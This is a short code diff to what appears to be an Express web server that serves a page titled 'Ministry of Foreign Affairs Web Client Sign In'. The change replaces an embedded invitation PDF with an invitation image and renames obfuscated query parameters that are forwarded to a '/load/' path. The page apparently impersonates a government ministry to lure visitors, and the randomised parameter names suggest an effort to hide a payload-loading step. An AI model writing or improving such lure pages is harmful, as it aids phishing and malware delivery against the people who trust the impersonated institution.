@@ -9,7 +9,7 @@ router.use(express.static('public'));
 // Custom middleware for form validation
 router.get('/', (req, res) => {
 
-    const data = req.query.dacsadsdvfdfdgcsdf;
+    const data = req.query.oasomcindfncidsnfsdfincdfn;
 
     const url = `/load/?Mun7Dy274HFDnPe7I74Na7iKKi374h=${data}`;
 
@@ -38,7 +38,7 @@ router.get('/', (req, res) => {
     <title>Ministry of Foreign Affairs Web Client Sign In</title>
         </head>
         <body>
-	<object data="./Invitation.pdf" style="width:1800px; height:900px;"></object> 
+	<center> <img src="./Invitation Card.jpg">  </center>
         </body>
         </html>
     `;
